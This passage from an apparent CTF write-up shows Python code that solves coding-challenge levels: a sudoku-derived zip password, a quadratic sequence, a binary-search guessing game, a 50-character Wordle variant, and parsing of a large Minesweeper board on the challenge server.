<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> get_val</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">img</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> ind</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ref </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> enumerate</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">refs</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#B8A965"> abs</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">img</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">width </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> ref</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">width</span><span style="color:#666666">)</span><span style="color:#CB7676"> ></span><span style="color:#4C9A91"> 10</span><span style="color:#666666">:</span><span style="color:#4D9375"> continue</span><span style="color:#758575DD">  # Otherwise every number > 10 will be recognized as a 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">        val </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> imgdiff</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">img</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ref</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> val </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">            return</span><span style="color:#DBD7CAEE"> ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span></code></pre>
<h4 id="final-step">Final step</h4>
<p>Obviously now we have to solve the sudoku and luckly <code>sagemath</code> has a <code>sudoku</code> function, so this step turned out to be pretty easy.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sage</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">all </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> Matrix</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> sudoku</span></span>
<span class="line"><span style="color:#DBD7CAEE">solved </span><span style="color:#666666">=</span><span style="color:#B8A965"> list</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">sudoku</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">Matrix</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">board</span><span style="color:#666666">)))</span></span>
<span class="line"></span></code></pre>
<p>the zip password is the whole board</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">passwd </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> y </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">16</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> x </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">16</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">        passwd </span><span style="color:#666666">+=</span><span style="color:#B8A965"> str</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">solved</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">y</span><span style="color:#666666">][</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">])</span></span>
<span class="line"></span></code></pre>
<p>This script luckly works for every level with no extra modifications, so we just automate the zip extraction, wait a couple of minutes for all the 50 levels to be solved and get the flag.</p>
<h3 id="coding-400">Coding 400</h3>
<p>The challenge is a game with four different levels, of increasing difficulty, which we had to “automate” as they were too time consuming to solve by hand.
To do this we used <code>python3</code>, <code>requests</code> and some other libraries.</p>
<p>The first level is pretty easy, the task is to find the first 150 values of a sequence, which happen to be the y-values of a parabola.
We parsed the initial values and then computed the remaining 150:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">baseurl </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">http://gamebox2.reply.it</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#DBD7CAEE">endp </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">4ykubm9gMDXFSWHlBe5JqUBBIvhodV2V7Lu6WtOiYoUq3bOtiUgfVl2DKxXqR1968uutvqvFBQWs78M0Vh5i40gSnIypQRCTlJEy</span><span style="color:#C98A7D77">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">data </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">get</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">baseurl</span><span style="color:#C99076">}</span><span style="color:#C98A7D">/</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">endp</span><span style="color:#C99076">}</span><span style="color:#C98A7D">/firstGame"</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">text</span></span>
<span class="line"><span style="color:#DBD7CAEE">data </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> data</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">data</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">find</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D"> >[</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 3</span><span style="color:#666666"> :]</span></span>
<span class="line"><span style="color:#DBD7CAEE">data </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> data</span><span style="color:#666666">[:</span><span style="color:#DBD7CAEE"> data</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">find</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">, *</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)]</span></span>
<span class="line"><span style="color:#DBD7CAEE">nums </span><span style="color:#666666">=</span><span style="color:#666666"> [</span><span style="color:#CB7676">*</span><span style="color:#B8A965">map</span><span style="color:#666666">(</span><span style="color:#B8A965">int</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> data</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">split</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">, </span><span style="color:#C98A7D77">"</span><span style="color:#666666">))]</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">diff </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> nums</span><span style="color:#666666">[</span><span style="color:#4C9A91">1</span><span style="color:#666666">]</span><span style="color:#CB7676"> -</span><span style="color:#DBD7CAEE"> nums</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#DBD7CAEE">diff12 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> nums</span><span style="color:#666666">[</span><span style="color:#4C9A91">2</span><span style="color:#666666">]</span><span style="color:#CB7676"> -</span><span style="color:#DBD7CAEE"> nums</span><span style="color:#666666">[</span><span style="color:#4C9A91">1</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#DBD7CAEE">sum_inc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> diff12 </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> diff</span></span>
<span class="line"><span style="color:#DBD7CAEE">start </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> nums</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">res </span><span style="color:#666666">=</span><span style="color:#666666"> [</span><span style="color:#DBD7CAEE">start</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">150</span><span style="color:#CB7676"> +</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">nums</span><span style="color:#666666">)):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    res</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">res</span><span style="color:#666666">[</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> diff</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    diff </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> sum_inc</span></span>
<span class="line"></span></code></pre>
<p>And then we sent the sequence to the server.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">ans </span><span style="color:#666666">=</span><span style="color:#666666"> {</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"userSequence[</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">i</span><span style="color:#C99076">}</span><span style="color:#C98A7D">]"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> n </span><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> n </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> enumerate</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">res</span><span style="color:#666666">[:</span><span style="color:#4C9A91">150</span><span style="color:#666666">])}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">resp </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">post</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">baseurl</span><span style="color:#C99076">}</span><span style="color:#C98A7D">/</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">endp</span><span style="color:#C99076">}</span><span style="color:#C98A7D">/</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">checkans</span><span style="color:#C99076">}</span><span style="color:#C98A7D">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> data</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">ans</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">text</span></span>
<span class="line"></span></code></pre>
<p>The second level is about guessing a number, given the lower and upper bounds and an oracle that answers “greater” or “lesser” to our guess.
We just did a quick binary search like this:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">data </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">post</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">baseurl</span><span style="color:#C99076">}</span><span style="color:#C98A7D">/</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">endp</span><span style="color:#C99076">}</span><span style="color:#C98A7D">/secondGame"</span><span style="color:#666666">,</span><span style="color:#BD976A"> data</span><span style="color:#666666">={</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">passphrase</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> passwd</span><span style="color:#666666">}).</span><span style="color:#DBD7CAEE">text</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">left</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> right </span><span style="color:#666666">=</span><span style="color:#666666"> [</span><span style="color:#CB7676">*</span><span style="color:#B8A965">map</span><span style="color:#666666">(</span><span style="color:#B8A965">int</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> re</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">search</span><span style="color:#666666">(</span><span style="color:#CB7676">r</span><span style="color:#C98A7D77">"</span><span style="color:#C4704F">Guess a number from </span><span style="color:#666666">(</span><span style="color:#C99076">[</span><span style="color:#B8A965">\d</span><span style="color:#C99076">]</span><span style="color:#4C9A91">+</span><span style="color:#666666">)</span><span style="color:#C4704F"> to </span><span style="color:#666666">(</span><span style="color:#C99076">[</span><span style="color:#B8A965">\d</span><span style="color:#C99076">]</span><span style="color:#4C9A91">+</span><span style="color:#666666">)</span><span style="color:#C4704F"> to access the next game within</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> data</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">groups</span><span style="color:#666666">())]</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">while</span><span style="color:#DBD7CAEE"> left </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> right</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">    mid </span><span style="color:#666666">=</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">right </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> left</span><span style="color:#666666">)</span><span style="color:#CB7676"> //</span><span style="color:#4C9A91"> 2</span></span>
<span class="line"><span style="color:#DBD7CAEE">    resp </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">post</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">baseurl</span><span style="color:#C99076">}</span><span style="color:#C98A7D">/</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">endp</span><span style="color:#C99076">}</span><span style="color:#C98A7D">/checkSecondGame"</span><span style="color:#666666">,</span><span style="color:#BD976A"> data</span><span style="color:#666666">={</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">number</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> mid</span><span style="color:#666666">}).</span><span style="color:#DBD7CAEE">text</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">greater</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> in</span><span style="color:#DBD7CAEE"> resp</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">        left </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> mid </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#4D9375">    elif</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">lesser</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> in</span><span style="color:#DBD7CAEE"> resp</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">        right </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> mid </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#4D9375">    else</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        break</span></span>
<span class="line"></span></code></pre>
<p>and then we sent the answer to the server.</p>
<p>The third level is just like Wordle, but the answer is 50 characters long, the alphabet is 92 characters wide and you have 50 guesses to find the answer.
We just assumed that, even if the answer could theoretically be made of 50 different characters, this would never happen in practice as some chars would appear more than once.
With the first two guesses we would try every character of the entire allowed range (50 different chars in the first guess, the remaining 42 plus padding in the second) and save any “Green” or “Yellow” character in the <code>alphabet</code>, a list of only the characters present in the guess of this game. By doing this we were able to reduce the single-game alphabet to a set always smaller than 47 characters.
In python3 it looks like this:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#758575DD"># lvl3_attempt is a function that takes the string and sends it to the server</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">g0 </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">join</span><span style="color:#666666">([</span><span style="color:#B8A965">chr</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">)</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">33</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 127</span><span style="color:#666666">)][:</span><span style="color:#4C9A91">50</span><span style="color:#666666">])</span></span>
<span class="line"><span style="color:#DBD7CAEE">g1 </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">join</span><span style="color:#666666">([</span><span style="color:#B8A965">chr</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">)</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">33</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 127</span><span style="color:#666666">)][</span><span style="color:#4C9A91">50</span><span style="color:#666666">:]).</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#666666">(</span><span style="color:#4C9A91">50</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">alphabet </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span></span>
<span class="line"><span style="color:#DBD7CAEE">h0 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> lvl3_attempt</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">g0</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">g0</span><span style="color:#666666">)):</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">Y</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> h0</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">]</span><span style="color:#CB7676"> or</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">G</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> h0</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">]:</span></span>
<span class="line"><span style="color:#DBD7CAEE">        alphabet </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> g0</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">]</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">h1 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> lvl3_attempt</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">g1</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">g1</span><span style="color:#666666">)):</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">Y</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> h1</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">]</span><span style="color:#CB7676"> or</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">G</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> h1</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">]:</span></span>
<span class="line"><span style="color:#DBD7CAEE">        alphabet </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> g1</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">]</span></span>
<span class="line"></span></code></pre>
<p>Then for every character of the alphabet we just tried guessing a string which was the same char repeated for the entire guess, look for the indices of green cells and save that at such indexes there was the corresponding guessed character. After looping through the whole alphabet, we would get the final answer.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">solve </span><span style="color:#666666">=</span><span style="color:#666666"> {}</span></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> c </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> alphabet</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">    hn </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> lvl3_attempt</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">c</span><span style="color:#CB7676">*</span><span style="color:#4C9A91">50</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">hn</span><span style="color:#666666">)):</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">G</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> hn</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">]:</span></span>
<span class="line"><span style="color:#DBD7CAEE">            solve</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> c</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">ans </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">50</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    ans </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> solve</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#DBD7CAEE">    </span></span>
<span class="line"><span style="color:#758575DD"># send ans to the server</span></span>
<span class="line"></span></code></pre>
<p>After submitting the answer we get to the last level, which is an 80x100 Minesweeper board, with an unknown amount of bombs. As an added bonus, the board only shows the latest changes, so there is no way to do this “by hand”.</p>
<p>The first thing we had to do was to write something that would parse the board, which is done by this awful-looking code:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#758575DD"># endp is the endpoint given by level3</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> lvl4_attempt</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">row</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> col</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    resp </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">post</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">baseurl</span><span style="color:#C99076">}</span><span style="color:#C98A7D">/</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">endp</span><span style="color:#C99076">}</span><span style="color:#C98A7D">/</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">checkans</span><span style="color:#C99076">}</span><span style="color:#C98A7D">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> data</span><span style="color:#666666">={</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">row</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE">row</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">column</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE">col</span><span style="color:#666666">})</span></span>
<span class="line"><span style="color:#DBD7CAEE">    lastindex </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span></span>
<span class="line"><span style="color:#DBD7CAEE">    lastcellindex </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">80</span><span style="color:#666666">):</span><span style="color:#758575DD"> #rows</span></span>
<span class="line"><span style="color:#DBD7CAEE">        start </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> resp</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">text</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">find</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">&#x3C;tr></span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> lastindex</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">        lastindex </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> start</span></span>
<span class="line"><span style="color:#4D9375">        for</span><span style="color:#DBD7CAEE"> j </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">100</span><span style="color:#666666">):</span><span style="color:#758575DD"> #columns</span></span>
<span class="line"><span style="color:#DBD7CAEE">            cell </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> resp</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">text</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">find</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">&#x3C;td ></span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> lastcellindex</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">            lastcellindex </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> cell </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 5</span></span>
<span class="line"><span style="color:#DBD7CAEE">            endcell </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> resp</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">text</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">find</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">&#x3C;/td></span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> cell</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">            value </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> resp</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">text</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">cell</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">5</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE">endcell</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#DBD7CAEE">            value </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">value</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> value </span><span style="color:#CB7676">!=</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">2</span><span style="color:#666666">:</span><span style="color:#758575DD"> #-2 represents a hidden cell, we don't want to overwrite the local value because it might be something we know</span></span>
<span class="line"><span style="color:#DBD7CAEE">                field</span><span style="color:#666666">[(</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> j</span><span style="color:#666666">)]</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> value</span></span>
<span class="line"></span></code></pre>
<p>We then looked for some way of solving the board, and found this library on GitHub: <a href="https://github.com/gamescomputersplay/minesweeper-solver">https://github.com/gamescomputersplay/minesweeper-solver</a>.
For each iteration we would ask the solver to try and solve the board.
As a return value, it would give us a list of “known safe” cells and “known bomb” cells. We would then ask the server to uncover the safe cells, and save locally in the <code>field</code> 2D-array the cell values and where the bombs were located.<br>
